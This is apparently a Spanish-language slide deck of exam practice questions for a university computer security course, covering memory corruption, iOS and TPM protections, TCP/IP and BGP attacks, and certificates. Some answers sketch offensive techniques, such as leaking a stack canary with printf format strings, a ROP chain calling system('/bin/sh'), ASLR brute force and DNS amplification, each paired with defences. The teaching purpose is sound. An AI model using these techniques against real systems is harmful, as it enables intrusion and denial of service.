---
marp: true
theme: default
paginate: true
backgroundColor: #fff
backgroundImage: url('../assets/hero-background.svg')
style: |
  section {
    font-size: 18px;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    align-items: flex-start;
    padding: 27px 50px 35px;
    line-height: 1.27;
  }
  h1 {
    font-size: 1.38em;
    margin: 0 0 0.35em 0;
    color: #123b5d;
  }
  p { margin: 0.28em 0; }
  ul, ol { margin: 0.25em 0 0.3em 0; padding-left: 1.25em; }
  li { margin: 0.12em 0; }
  strong { color: #123b5d; }
  code { font-size: 0.88em; }
  section.lead h1 { font-size: 2em; }
  section.lead p { font-size: 1.12em; color: #444; }
  .small { font-size: 0.86em; color: #555; }
  .tag { color: #2e6f9e; font-weight: 700; }
  blockquote { border-left: 5px solid #2e90fa; padding: 0.35em 0.8em; color: #333; }
---

<!-- _class: lead -->

# Interrogaci?n 2
## Banco de preguntas y respuestas

IIC2531 ? Seguridad Computacional

45 escenarios ? 135 subpreguntas ? 15 preguntas r?pidas

---

# C?mo est? armado este banco

- **45 escenarios**, 5 por cada uno de los 9 temas de la Interrogaci?n 2.
- Cada escenario tiene **3 subpreguntas** con respuesta inmediatamente debajo.
- **15 preguntas r?pidas** al final, para repaso de ?ltima hora.
- Los escenarios imitan el formato real: situaci?n concreta + adversario + decisiones de dise?o.

<div class="small">No memorices las respuestas: identifica el activo, la propiedad de seguridad, el mecanismo y su l?mite.</div>

---

# M?todo para responder

1. **?Cu?l es el activo?** Datos, claves, disponibilidad, identidad, anonimato.
2. **?Cu?l es el adversario y qu? puede hacer?** Red, acceso f?sico, insider, CA, nodo malicioso.
3. **?Qu? propiedad se rompe?** Confidencialidad, integridad, autenticaci?n, liveness, privacidad.
4. **?Qu? mecanismo la protege y d?nde est? la frontera de confianza?**
5. **?Qu? no protege ese mecanismo?** Cierra siempre con el l?mite y el trade-off.

---

# Mapa de temas

- **Tema 1** ? Buffer overflow, defensas y reutilizaci?n de c?digo
- **Tema 2** ? iOS: protecci?n de datos, enclave y usabilidad
- **Tema 3** ? BitLocker, TPM y arranque medido
- **Tema 4** ? TCP/IP, liveness y canales seguros
- **Tema 5** ? Certificados, CAs y confianza operacional
- **Tema 6** ? Web: SOP, cookies, CORS, XSS y CSRF
- **Tema 7** ? OWASP Top 10 y dise?o defensivo
- **Tema 8** ? Autenticaci?n, passwords y U2F
- **Tema 9** ? Tor, circuitos y hidden services

---

# Parte I ? Temas 1?3

---

# Tema 1 · Escenario 1: El canario que se fugó por `printf`

**Situación.** Un servicio de chat en Linux compila con `-fstack-protector-strong`, NX y PIE. El handler hace `printf(buf)` para mostrar el mensaje y luego `gets(buf)` sobre un buffer de 64 bytes. Un atacante remoto quiere ejecutar código.

**a) ¿Por qué el canario no basta si el programa imprime el buffer?**

**Respuesta.**
- El canario solo detecta escrituras secuenciales hacia arriba; no impide leerlo.
- `printf(buf)` interpreta `%p`/`%s` del atacante y filtra el valor del canario y direcciones de libc/stack.
- Con la fuga, el overflow puede reescribir el canario con su valor correcto y pasar la verificación.

**b) Compare canario y shadow stack frente a este bug.**

**Respuesta.**
- El canario protege la dirección de retorno pero es un dato en memoria escribible y filtrable.
- Shadow stack guarda una copia de la dirección de retorno fuera del espacio escribible y la compara en `ret`.
- Aun así, la fuga de libc seguiría habilitando ROP: el shadow stack no elimina la reutilización de código.

**c) Proponga el arreglo y una mitigación de despliegue.**

**Respuesta.**
- Reemplazar por `printf("%s", buf)` y `fgets(buf, sizeof buf, stdin)`; compilar con `-D_FORTIFY_SOURCE=2`.
- Activar CET/`-fcf-protection` (shadow stack + IBT) y full RELRO para dificultar el pivote.
- Añadir análisis estático que bloquee formatos no literales y `gets`.

---

# Tema 1 · Escenario 2: NX no significa "sin ejecución"

**Situación.** Un binario no-PIE enlazado estáticamente tiene NX activo y ASLR de libc, pero no de su propio código. Un CTF pide obtener shell a través de un overflow en la función `read`.

**a) ¿Por qué NX no detiene este ataque?**

**Respuesta.**
- NX solo marca la pila y el heap como no ejecutables.
- El atacante no inyecta shellcode: reutiliza instrucciones ya presentes en la región ejecutable del binario.
- Basta encadenar gadgets y funciones existentes (ROP/ret2plt) para lograr el mismo efecto.

**b) Compare ret2libc, ret2plt y ROP en este binario.**

**Respuesta.**
- ret2libc requiere conocer la base de libc; aquí ASLR la randomiza.
- ret2plt usa la PLT del binario, cuya dirección es fija al no haber PIE, para llamar a `system` o `read`.
- ROP permite además controlar argumentos (`pop rdi; ret`) y encadenar varias llamadas sin depender de libc.

**c) Diseñe la cadena para ejecutar `/bin/sh` con solo fugas del binario.**

**Respuesta.**
- Usar `read@plt` para escribir "/bin/sh" en `.bss` y luego `system@plt` con `pop rdi` apuntando allí.
- Alternativa: filtrar `read@got` con `write@plt`, calcular la base de libc y volver a explotar.
- Con full RELRO y sin gadgets suficientes, el camino se cierra o exige un segundo bug.

---

# Tema 1 · Escenario 3: El heap también se desborda

**Situación.** Un servidor de notas asigna `struct nota { char texto[64]; void (*render)(nota*); }` en el heap y copia el título sin validar longitud. El stack tiene canarios y NX; el heap no tiene protección equivalente.

**a) ¿Por qué el canario y NX no cubren esta corrupción?**

**Respuesta.**
- El canario vive junto al marco de pila; un overflow dentro del heap no lo toca.
- La escritura desborda `texto` y sobrescribe el puntero `render`, que se invoca después.
- NX impide ejecutar datos inyectados, pero el puntero puede apuntar a código existente.

**b) Compare explotar el stack y explotar el heap en este caso.**

**Respuesta.**
- En el stack el objetivo típico es la dirección de retorno; aquí el objetivo es un puntero de función.
- El heap no tiene canario por objeto, pero glibc añade metadatos (chunks, tcache) que también son objetivo.
- La asignación y el layout son menos deterministas, aunque un puntero de función da control directo e inmediato.

**c) ¿Qué defensa de diseño y qué endurecimiento de allocator aplicaría?**

**Respuesta.**
- Validar longitud, usar `strlcpy`/`snprintf` y separar datos de punteros de control (vtable en región de solo lectura).
- Activar `safe-linking` en tcache, `malloc` hardening y cuarentena de chunks liberados.
- Compilar con `-fsanitize=address` en pruebas y CFI para rechazar llamadas a destinos no previstos.

---

# Tema 1 · Escenario 4: ASLR parcial y fuerza bruta con `fork`

**Situación.** Un daemon hace `fork()` por conexión y el hijo procesa un paquete con overflow. ASLR randomiza la pila y libc, pero el servidor no reinicia: cada hijo hereda el mismo layout del padre.

**a) ¿Por qué la herencia de `fork` debilita ASLR?**

**Respuesta.**
- `fork` copia el espacio de direcciones del padre, incluida la aleatorización ya sorteada.
- Todos los hijos comparten las mismas direcciones de pila y libc.
- Un crash del hijo no re-sortea nada: el atacante reintenta contra el mismo layout.

**b) Estime la viabilidad de la fuerza bruta y compárela con un escenario con re-exec.**

**Respuesta.**
- Con 16 bits de entropía efectivos, la probabilidad por intento es 2⁻¹⁶; miles de intentos son viables si cada uno es barato.
- Si el proceso se re-ejecuta por conexión, cada intento tiene un layout nuevo y la probabilidad no se acumula.
- La viabilidad depende de la entropía real, no solo de que ASLR esté "encendido".

**c) ¿Cómo mitiga el servidor este ataque sin abandonar `fork`?**

**Respuesta.**
- Re-ejecutar (`execve`) al hijo o usar un pre-fork con `personality`/re-randomización periódica.
- Añadir canarios, NX y PIE para que un intento fallido no sea trivialmente repetible.
- Detectar crashes repetidos y bloquear la IP: reduce la tasa, pero no sustituye la entropía.

---

# Tema 1 · Escenario 5: El byte nulo que esquivó el canario

**Situación.** Un parser copia exactamente 256 bytes en un buffer de 256 y luego escribe un `'\0'` de terminación. Ese byte cae sobre el byte bajo del RBP guardado; el canario queda intacto y la función retorna con `leave; ret`.

**a) ¿Por qué un solo byte nulo puede ser suficiente?**

**Respuesta.**
- El off-by-one no altera el canario, así que la verificación pasa.
- El byte nulo solo cambia los 8 bits bajos del RBP guardado, moviendo el marco a una dirección cercana y controlable.
- En el `leave`, `rsp` toma ese valor manipulado y el `ret` lee una dirección elegida por el atacante.

**b) ¿Qué defensas detectan o bloquean este caso y cuáles no?**

**Respuesta.**
- El canario no lo detecta: no se sobrescribe.
- ASan con redzones y `-fstack-clash-protection` sí detectan el acceso fuera de límites.
- Shadow stack y CET protegen el `ret`, pero no impiden el pivote previo del marco.

**c) Corrija el código y proponga una prueba que lo habría encontrado.**

**Respuesta.**
- Reservar 257 bytes o usar una copia acotada que no escriba el terminador fuera del buffer.
- Fuzzing con ASan y entradas de longitud exacta (`256`, `257`) para exponer el off-by-one.
- Revisar todo uso de `strncpy`/`strncat` que pueda dejar el terminador fuera del destino.

---

# Tema 2 · Escenario 1: La app bancaria que no puede leer en segundo plano

**Situación.** Una app de banca guarda el token de sesión en un archivo con `NSFileProtectionComplete`. Cuando el usuario bloquea el teléfono, una descarga en segundo plano falla con "file is inaccessible". El equipo duda entre bajar la clase de protección o rediseñar.

**a) ¿Por qué falla la descarga y qué revela sobre la clase elegida?**

**Respuesta.**
- `Complete` deriva la clave de la clase del passcode y la descarta al bloquear.
- Sin esa clave, el archivo no se puede descifrar ni escribir mientras el dispositivo está bloqueado.
- La falla es el comportamiento correcto: la clase asume que no hay acceso mientras está bloqueado.

**b) Compare `Complete`, `CompleteUnlessOpen` y `UntilFirstUserAuthentication`.**

**Respuesta.**
- `Complete`: sin acceso tras el bloqueo; máxima confidencialidad en reposo.
- `CompleteUnlessOpen`: un archivo ya abierto sigue accesible mientras el descriptor viva; permite descargas en curso.
- `UntilFirstUserAuthentication`: clave disponible tras el primer desbloqueo; cómodo para tareas de fondo, pero expuesto si el equipo se roba desbloqueado.

**c) ¿Qué diseño recomendaría para el token y para la descarga?**

**Respuesta.**
- Token en `Complete` y reabierto solo tras autenticación del usuario.
- Descarga en un contenedor temporal con `CompleteUnlessOpen`, cifrado propio y borrado al terminar.
- No degradar la clase del token por comodidad: separar por sensibilidad y ciclo de vida.

---

# Tema 2 · Escenario 2: Extraer la clave que el CPU no puede ver

**Situación.** Se incauta un iPhone con passcode de 6 dígitos. El perito extrae la NAND y monta un ataque de fuerza bruta fuera del teléfono, suponiendo que puede probar claves contra los datos copiados.

**a) ¿Por qué la copia de la NAND no habilita la fuerza bruta directa?**

**Respuesta.**
- Las claves de clase están envueltas por claves derivadas del passcode y del UID key.
- El UID key reside en el Secure Enclave y es único por dispositivo; no se puede extraer ni replicar.
- Sin el SEP que desenvuelva, cada candidato exige el hardware original y su control de intentos.

**b) ¿Qué aporta el Secure Enclave frente a un coprocesador cualquiera?**

**Respuesta.**
- Aísla el material clave del CPU y del sistema operativo, incluso con kernel comprometido.
- Impone retardo creciente y bloqueo tras intentos fallidos; el borrado tras 10 fallos es opcional.
- Su firmware y arranque se verifican aparte, de modo que el SO no puede "saltarse" la política.

**c) ¿Qué vectores quedan y cómo se endurecen?**

**Respuesta.**
- Passcodes cortos siguen siendo débiles frente a observación o shoulder surfing; exigir 6+ dígitos y passphrase.
- Ataques de hardware al bus o fallos del SEP son costosos, pero existen: mantener firmware actualizado.
- El borrado seguro depende de destruir claves, no de sobrescribir NAND (que tiene wear leveling).

---

# Tema 2 · Escenario 3: Face ID, el gemelo y el quinto intento

**Situación.** Un empleado habilita Face ID en un teléfono corporativo. Un atacante con acceso físico usa una foto y luego intenta repetidamente; tras varios fallos el teléfono pide el passcode. Se pregunta si Face ID "es más seguro" que el PIN.

**a) ¿Por qué Face ID no es simplemente un reemplazo más fuerte del passcode?**

**Respuesta.**
- Face ID es autenticación biométrica local: alta comodidad, pero con tasa de falso positivo no nula (Apple declara ~1 en 1.000.000).
- El passcode sigue siendo el ancla: se exige tras reinicio, tras 5 fallos y para cambiar ajustes.
- La biometría no se puede cambiar si se filtra; el passcode sí.

**b) Compare el modelo de amenaza de Face ID y el del passcode.**

**Respuesta.**
- Face ID resiste observación y hombro, pero es vulnerable a gemelos, gemelos idénticos y ataques de presentación sofisticados.
- El PIN resiste mejor la suplantación física, pero es vulnerable a shoulder surfing y a fuerza bruta si es corto.
- Contra un atacante que puede observar la pantalla, el PIN es peor; contra un gemelo, Face ID es peor.

**c) ¿Cómo configuraría el teléfono corporativo y qué límite aceptaría?**

**Respuesta.**
- Passcode alfanumérico largo como factor primario y Face ID solo como conveniencia.
- Exigir passcode tras 5 fallos y activar borrado tras 10; desactivar el fallback innecesario en modo restringido.
- Aceptar que la biometría no es un secreto: no usarla para autorizar operaciones irreversibles de alto valor.

---

# Tema 2 · Escenario 4: Instalar un iOS viejo y vulnerable

**Situación.** Un atacante con el dispositivo en la mano intenta restaurar una versión antigua de iOS que tiene un exploit conocido de kernel, usando una copia del firmware descargada de un mirror no oficial.

**a) ¿Qué impide que el dispositivo acepte ese firmware?

**Respuesta.**
- El arranque seguro encadena verificaciones desde el Boot ROM inmutable hasta el kernel.
- Cada imagen va firmada y "personalizada" con el ECID del chip y un nonce; una firma de otro dispositivo no sirve.
- Apple deja de firmar versiones antiguas, por lo que no se puede obtener un ticket válido para ellas.

**b) Compare Secure Boot y el mecanismo de tickets/nonce en este escenario.**

**Respuesta.**
- Secure Boot responde "¿está firmado por Apple?"; el ticket/nonce responde "¿esta imagen está autorizada para este dispositivo y esta sesión?".
- El nonce evita reutilizar un ticket capturado; sin él, un ataque de replay podría restaurar una versión aún firmada.
- Juntos bloquean tanto firmware no firmado como downgrades no autorizados.

**c) Si el atacante controla el host de restauración, ¿qué podría intentar y qué lo frena?**

**Respuesta.**
- Reutilizar un APTicket válido para otra sesión: lo frena el nonce aleatorio del dispositivo.
- Servir una imagen modificada: la firma del IMG4 no valida.
- Aprovechar un bug del cargador: por eso el Boot ROM es inmutable y el resto se actualiza con parches.

---

# Tema 2 · Escenario 5: Vender el teléfono sin dejar rastro

**Situación.** Una empresa recolecta teléfonos usados y los vende. El procedimiento actual es "borrar todo el contenido y ajustes" y luego sobrescribir el almacenamiento con ceros desde una app. Un auditor duda de que eso garantice confidencialidad.

**a) ¿Por qué sobrescribir con ceros no es un borrado seguro fiable en NAND?**

**Respuesta.**
- La NAND tiene wear leveling y bloques de repuesto: la escritura lógica no toca necesariamente las celdas físicas originales.
- Pueden quedar copias en bloques retirados, cachés o áreas reservadas del controlador.
- El cifrado por archivo cambia el problema: destruir la clave es más fiable que sobrescribir.

**b) Compare borrado criptográfico y sobrescritura física.**

**Respuesta.**
- El borrado criptográfico destruye las claves de clase en el almacenamiento efímero; los datos quedan cifrados e inutilizables.
- Es rápido, funciona con wear leveling y cubre copias internas del controlador.
- La sobrescritura solo es concluyente con acceso al firmware del controlador o destrucción física.

**c) ¿Qué verificaría antes de revender y qué riesgo residual queda?**

**Respuesta.**
- Confirmar que "Erase All Content and Settings" destruyó las claves y que el dispositivo quedó sin passcode ni cuenta.
- Revisar copias de seguridad y cuentas cloud asociadas, que sobreviven al borrado local.
- Riesgo residual: fallos en la implementación del borrado o claves recuperadas por un ataque físico avanzado.

---

# Tema 3 · Escenario 1: BitLocker sin PIN y el maletín ajeno

**Situación.** Una consultora usa BitLocker en modo "solo TPM" para no pedir PIN a los usuarios. Un auditor deja un portátil apagado en una sala compartida y otro participante lo enciende y extrae el disco.

**a) ¿Qué protege exactamente BitLocker solo-TPM y qué no?**

**Respuesta.**
- Cifra el disco en reposo y sella la clave contra el TPM y ciertos PCR (estado de arranque).
- No autentica al usuario: cualquier persona que encienda el equipo en el estado esperado obtiene el disco descifrado.
- Protege contra robo del disco, no contra robo del portátil completo.

**b) Compare TPM-solo, TPM+PIN y TPM+PIN+USB.**

**Respuesta.**
- TPM-solo: transparente, pero sin factor humano; vulnerable a arranque no vigilado.
- TPM+PIN: añade un secreto que el TPM no puede verificar solo; frena el arranque por un tercero.
- Añadir USB incrementa seguridad pero empeora la usabilidad y la recuperación; el PIN sigue siendo el equilibrio habitual.

**c) ¿Cómo endurecería el despliegue sin arruinar la experiencia?**

**Respuesta.**
- Activar PIN al arrancar en equipos portátiles y exigir contraseña tras suspensión.
- Sellar contra PCR de Secure Boot y firmware, y monitorear cambios de configuración.
- Bloquear DMA en puertos externos y exigir hibernación cifrada en lugar de suspensión.

---

# Tema 3 · Escenario 2: El candado que no mide nada

**Situación.** Un proveedor afirma que su equipo es "seguro porque tiene Secure Boot". El cliente pregunta cómo puede saber que el servidor arrancó el cargador esperado y no otro firmado por una CA comprometida.

**a) ¿Qué garantiza Secure Boot y qué no?**

**Respuesta.**
- Secure Boot solo ejecuta imágenes firmadas por claves de la base de datos de confianza.
- No registra qué imagen se ejecutó ni permite demostrarlo a un tercero.
- Una clave comprometida o una entrada añadida a `db` puede producir un arranque "válido" pero no deseado.

**b) Compare Secure Boot con Measured Boot y atestación.**

**Respuesta.**
- Secure Boot aplica una política de permitir/denegar; Measured Boot solo mide y registra, sin bloquear.
- Las mediciones se extienden en PCR y se firman en un quote con una clave de identidad (AIK).
- El verificador remoto compara contra valores de referencia y detecta diferencias que Secure Boot no revela.

**c) Diseñe la verificación remota y su punto débil.**

**Respuesta.**
- El servidor mide cada etapa, extiende PCR y envía un quote firmado con nonce fresco.
- El verificador valida la firma, el nonce y la política de PCR esperada antes de entregar secretos.
- Punto débil: confiar en los valores de referencia y en la raíz de confianza del TPM; si el firmware miente, la atestación miente.

---

# Tema 3 · Escenario 3: La actualización que rompió el `unseal`

**Situación.** Un servidor selló su clave de disco contra PCR 0 y 7. Tras una actualización legítima de firmware, el TPM ya no desella la clave y el equipo no arranca. El administrador propone "desactivar el sellado" para evitarlo.

**a) ¿Por qué la actualización rompió el desellado?**

**Respuesta.**
- `PCR_extend` es acumulativa: el nuevo hash de firmware cambia el valor de PCR 0 de forma irreversible.
- La política de sellado exige valores exactos; al no coincidir, el TPM niega la operación.
- El fallo es la prueba de que el sellado funcionaba.

**b) Compare sellar contra valores exactos y usar una política flexible.**

**Respuesta.**
- Valores exactos: máxima integridad, pero cualquier actualización rompe el arranque.
- Política con firma/versión o con PCR de configuración menos volátiles: más tolerante, menos estricta.
- Alternativa: sellar contra una clave de recuperación custodiada, no solo contra PCR.

**c) ¿Cómo planificaría la actualización sin perder la protección?**

**Respuesta.**
- Ensayar el nuevo valor de PCR, preparar la re-selladura y una clave de recuperación fuera del equipo.
- Usar autorización por política firmada o un contador de versión que acepte actualizaciones previstas.
- No desactivar el sellado de forma permanente: eso convierte el TPM en un simple adorno.

---

# Tema 3 · Escenario 4: El puerto que lee la RAM

**Situación.** Un atacante con acceso físico de minutos a un portátil bloqueado conecta un dispositivo por Thunderbolt y lee memoria, o enfría los módulos DRAM para un cold boot. BitLocker está activo y el equipo está suspendido.

**a) ¿Por qué la suspensión es peor que el apagado para la confidencialidad?**

**Respuesta.**
- En suspensión la RAM sigue energizada y contiene la clave de volumen descifrada.
- DMA permite a un periférico leer o escribir memoria sin pasar por el CPU.
- Un cold boot aprovecha la remanencia de DRAM para recuperar su contenido tras un reinicio.

**b) Compare DMA, cold boot y ataque al disco cifrado.**

**Respuesta.**
- DMA: no requiere abrir el equipo; depende de IOMMU, política de puertos y del SO.
- Cold boot: necesita acceso físico y tiempo, pero funciona aunque el disco esté cifrado.
- Atacar el disco: lo frena el TPM; los otros dos atacan el estado en claro, no el cifrado.

**c) ¿Qué controles aplicarían y cuál es el límite?**

**Respuesta.**
- IOMMU/VT-d, "Kernel DMA Protection" y deshabilitar puertos en reposo o suspensión.
- Hibernar en lugar de suspender y exigir PIN al reanudar; sellar también contra el estado de suspensión.
- Límite: con acceso físico prolongado y hardware vulnerable, ningún control de software es absoluto.

---

# Tema 3 · Escenario 5: Actualizar firmware y volver atrás

**Situación.** Un fabricante publica firmware 2.0 que corrige una vulnerabilidad, pero un atacante intenta reinstalar la 1.0 para reexplotarla. Además, el equipo usa un TPM sin certificado de clave de endorsamiento (EK) verificable, y el usuario "confía" en el candado de la pantalla.

**a) ¿Por qué la versión importa y cómo se impide el rollback?**

**Respuesta.**
- Una versión antigua conserva vulnerabilidades conocidas y puede anular mitigaciones.
- Se usa un contador anti-rollback en NV del TPM o en fusibles: la versión instalada no puede bajar.
- El cargador verifica versión y firma antes de aceptar la imagen.

**b) Compare Secure Boot, medición y contador anti-rollback.**

**Respuesta.**
- Secure Boot valida el firmante, no la novedad.
- La medición detecta que algo cambió, pero no impide ejecutarlo.
- El contador anti-rollback impone una cota de versión; sin él, una imagen firmada vieja sigue siendo aceptable.

**c) ¿Qué valor tiene la "autenticación del pobre" y cuál es su riesgo?**

**Respuesta.**
- Sin EK certificado ni atestación, el usuario solo tiene señales visuales (candado, mensaje de arranque).
- Sirve contra errores accidentales, no contra un adversario que controla firmware o pantalla.
- Mitigación: verificación fuera de banda, EK con certificado y atestación remota; el TOFU no sustituye una raíz de confianza.

---

# Preguntas rápidas · Bloque 1

**1. ¿Por qué un canario no detiene un ataque de format string?** Porque el canario protege escrituras, no lecturas: `printf(buf)` filtra su valor y luego se reescribe correctamente.

**2. ¿Qué defensa impide ROP sin eliminar la reutilización de código?** Ninguna la elimina del todo; CET/shadow stack e IBT la restringen, y full ASLR/PIE la encarecen.

**3. ¿Por qué una copia de la NAND de un iPhone no permite fuerza bruta offline?** Las claves están envueltas con el UID key del Secure Enclave, que no se extrae ni se replica.

**4. ¿Secure Boot impide un downgrade de firmware?** No por sí solo: hace falta además anti-rollback y tickets personalizados con ECID/nonce.

**5. ¿Por qué TPM-solo es más débil que TPM+PIN?** Porque no hay factor humano: quien encienda el equipo en el estado esperado obtiene la clave sin autenticarse.

---

# Parte II ? Temas 4?6

---

# Tema 4 · Escenario 1: La IP de origen no es una credencial

**Situación.** Una empresa mantiene un servidor interno con `.rhosts` que confía en `10.0.0.5`. Un atacante en la misma red envía un SYN con esa IP falsificada y completa el handshake adivinando el ISN. Luego ejecuta comandos sin conocer ninguna contraseña.

**a) ¿Por qué verificar la dirección IP de origen no autentica al cliente?**

**Respuesta.**
- **Idea central:** la IP es un dato que cualquiera puede escribir en el encabezado; no prueba posesión de la identidad.
- **Justificación técnica:** TCP solo fija estado mediante los ISN; no firma los paquetes ni valida que el origen sea quien dice ser. El SYN-ACK viaja al host real, pero el atacante no necesita recibirlo si acierta el número de secuencia.
- **Consecuencia o límite:** la autenticación por IP cae ante spoofing fuera de ruta y es trivial para un atacante en ruta; el DNS inverso tampoco ayuda, porque el dueño de la zona puede declarar cualquier nombre.

**b) ¿Qué cambia entre un atacante fuera de ruta y uno en ruta, y qué de eso resuelve TLS?**

**Respuesta.**
- Fuera de ruta debe adivinar el ISN y el puerto, y competir con las respuestas legítimas; en ruta observa los números de secuencia y puede inyectar o cortar sin adivinar.
- TLS autentica al servidor y protege integridad y confidencialidad del contenido, pero no impide que se inyecte un RST ni que se descarten paquetes.
- Por eso TLS resuelve suplantación y manipulación, no disponibilidad.

**c) Diseñe una migración para ese servidor interno.**

**Respuesta.**
- Reemplazar `.rhosts` por SSH o TLS con autenticación mutua y claves por usuario o por host.
- Aplicar filtrado de entrada en el borde (BCP 38) para reducir paquetes con origen falsificado y eliminar la confianza en DNS inverso.
- Segmentar la red y monitorear intentos de conexión desde direcciones que no deberían originar tráfico.

---

# Tema 4 · Escenario 2: Un RST que apaga una sesión BGP

**Situación.** Un atacante inyecta un paquete RST con la IP de un router par y un número de secuencia dentro de la ventana de una sesión BGP. La sesión cae y el ISP retira rutas durante varios minutos. El tráfico legítimo se degrada aunque no se haya leído ni modificado.

**a) ¿Por qué un solo paquete RST puede terminar una conexión establecida?**

**Respuesta.**
- **Idea central:** TCP acepta un RST cuya secuencia caiga en la ventana esperada, sin exigir un nuevo handshake.
- **Justificación técnica:** basta conocer la tupla origen-destino y un número de secuencia válido; el receptor asume que el otro extremo abortó.
- **Consecuencia o límite:** el ataque es de disponibilidad, no de confidencialidad; si el atacante está fuera de ruta debe adivinar la secuencia, y si está en ruta solo debe observarla.

**b) ¿En qué se diferencia un reset de un secuestro, y qué garantiza TLS en cada caso?**

**Respuesta.**
- El reset corta la comunicación; el secuestro inyecta datos en una conexión viva y permite actuar como uno de los extremos.
- TLS protege la integridad y confidencialidad de los datos establecidos, pero no evita un RST porque ocurre en la capa de transporte.
- TLS tampoco impide un secuestro si el atacante controla un extremo legítimo; sí detecta modificaciones en tránsito.

**c) ¿Qué controles reducirían el riesgo en la sesión BGP?**

**Respuesta.**
- Usar TCP-AO para autenticar cada segmento de la sesión, en lugar de confiar solo en la IP de los pares.
- Aplicar GTSM o filtros de TTL y prefijos permitidos para dificultar paquetes inyectados desde fuera del enlace.
- Monitorear caídas anómalas y tener rutas de respaldo; la autenticación de la sesión no protege la confidencialidad del tráfico.

---

# Tema 4 · Escenario 3: SYN flooding contra el portal de pagos

**Situación.** El portal de pagos recibe decenas de miles de SYN por segundo con direcciones de origen aleatorias. El backlog se llena y los clientes legítimos quedan fuera mientras el servidor espera ACK que nunca llegan. El ataque es de baja tasa por origen, así que no se distingue fácilmente.

**a) ¿Cómo evitan las SYN cookies que se agote el backlog y qué precio pagan?**

**Respuesta.**
- **Idea central:** el servidor no reserva estado hasta recibir el tercer paquete; codifica el estado necesario en el ISN con un MAC y un timestamp.
- **Justificación técnica:** al llegar el ACK, recalcula el hash con la tupla y el secreto; si coincide, crea la conexión sin haber guardado nada antes.
- **Consecuencia o límite:** se pierden algunas opciones TCP, como el escalado de ventana, y el atacante aún consume ancho de banda y CPU; las cookies no hacen desaparecer el flood.

**b) Compare SYN cookies, SYN cache y limpieza en un scrubbing center.**

**Respuesta.**
- SYN cookies eliminan el estado por conexión pendiente, pero degradan funciones TCP y no filtran tráfico.
- SYN cache guarda estado mínimo y conserva opciones, aunque sigue limitado por memoria y por la tasa de llegada.
- El scrubbing o los proxies absorben el volumen antes del servidor, pero cuestan dinero, añaden latencia y dependen de detección.

**c) Proponga una defensa en capas y explique su límite.**

**Respuesta.**
- Activar SYN cookies, ajustar backlogs y aplicar límites por origen en el borde.
- Contratar mitigación volumétrica o anycast para absorber picos que el servidor no puede procesar.
- Monitorear latencia y tasas anómalas; ninguna capa garantiza disponibilidad si el enlace de acceso se satura.

---

# Tema 4 · Escenario 4: DNS abierto como amplificador

**Situación.** Un resolutor DNS abierto recibe consultas con la IP de una víctima falsificada. Las respuestas, infladas por DNSSEC, llegan a la víctima y saturan su enlace. El atacante envía consultas pequeñas y obtiene un factor de amplificación alto.

**a) ¿Por qué la amplificación depende del spoofing y de UDP?**

**Respuesta.**
- **Idea central:** el atacante hace que un tercero dirija una respuesta grande a la víctima sin completar un handshake.
- **Justificación técnica:** UDP permite enviar una consulta con origen falsificado; el resolutor responde a esa dirección y el atacante nunca necesita recibir la respuesta.
- **Consecuencia o límite:** si se filtra el spoofing en el origen o se cierra el resolutor, el ataque pierde su combustible; el volumen agregado sigue siendo el problema.

**b) Compare Smurf, amplificación DNS y Memcached.**

**Respuesta.**
- Smurf usa ICMP echo a una dirección de broadcast y obtiene una respuesta por cada equipo de la subred.
- DNS explota respuestas mayores que la consulta, especialmente con DNSSEC, y puede usar miles de resolutores abiertos.
- Memcached sobre UDP logra factores mucho mayores porque devuelve bloques de datos grandes; las tres variantes son reflexión con origen falsificado.

**c) ¿Qué medidas debe tomar un operador de red y un operador de servicio?**

**Respuesta.**
- El operador de red aplica filtrado de entrada BCP 38 para bloquear orígenes falsificados.
- El operador de servicio cierra resolutores abiertos, deshabilita Memcached en UDP y aplica límites de respuesta.
- Añadir anycast y scrubbing ayuda a absorber el volumen, pero no sustituye la prevención del spoofing.

---

# Tema 4 · Escenario 5: Un prefijo más específico secuestra al banco

**Situación.** Un ISP anuncia un prefijo más específico que el de un banco y atrae su tráfico durante dos horas. Los clientes llegan a un destino controlado o simplemente pierden conectividad. El banco no cambió nada en sus servidores.

**a) ¿Por qué BGP no impide que un anuncio falso gane?**

**Respuesta.**
- **Idea central:** BGP propaga anuncios de alcanzabilidad y confía en que cada par anuncia lo que le corresponde; no hay autorización criptográfica del origen.
- **Justificación técnica:** la selección de ruta prefiere el prefijo más específico y la ruta más corta, así que un anuncio /24 puede vencer al /16 legítimo.
- **Consecuencia o límite:** el efecto es global y rápido, pero el atacante debe controlar o engañar a un ISP; no necesita tocar los servidores del banco.

**b) Distinga un secuestro de una fuga de rutas y sus impactos.**

**Respuesta.**
- El secuestro anuncia un prefijo ajeno de forma deliberada para interceptar o blackholear tráfico.
- La fuga ocurre cuando un ISP reanuncia rutas aprendidas de un cliente o par a otro, por error de configuración.
- Ambos redirigen tráfico a donde no corresponde; la fuga suele ser accidental y masiva, el secuestro suele ser selectivo y malicioso.

**c) ¿Qué defensas existen y qué no cubren?**

**Respuesta.**
- RPKI con validación de origen (ROV) permite rechazar anuncios cuyo AS no está autorizado para el prefijo.
- Filtros IRR, límites de prefijos y TCP-AO en las sesiones reducen errores y ataques, pero dependen de adopción y configuración correcta.
- RPKI no protege la ruta completa ni la confidencialidad; un atacante en ruta aún puede observar o manipular tráfico sin TLS.

---

# Tema 5 · Escenario 1: El candado que no dice todo

**Situación.** Un usuario entra a `https://banco.cl` desde una red WiFi hostil. El atacante intenta presentar un certificado emitido para `banco.cl.evil.com` y otro autofirmado. El navegador rechaza ambos, pero el usuario no sabe qué comprobó realmente.

**a) ¿Qué valida el navegador al mostrar el candado y qué no valida?**

**Respuesta.**
- **Idea central:** valida que una CA confiable certifica el vínculo entre el nombre DNS de la URL y la clave pública presentada.
- **Justificación técnica:** revisa la cadena hasta una raíz instalada, la firma, la vigencia, el nombre, la revocación y la prueba de posesión de la clave privada en el handshake.
- **Consecuencia o límite:** no prueba que el sitio sea honesto ni que el negocio exista; solo que quien responde controla ese nombre ante alguna CA.

**b) Compare validación DV y EV para ese banco.**

**Respuesta.**
- DV verifica control técnico del dominio, suele ser automatizable y barato, pero no valida a la entidad legal.
- EV intenta verificar a la empresa y mostrar un indicador especial, con más costo y burocracia.
- EV no resolvió la percepción del usuario y hoy predominan los certificados DV; el candado no distingue la calidad del negocio.

**c) ¿Qué controles adicionales debería operar el banco?**

**Respuesta.**
- Publicar CAA para limitar qué CAs pueden emitir certificados para su dominio.
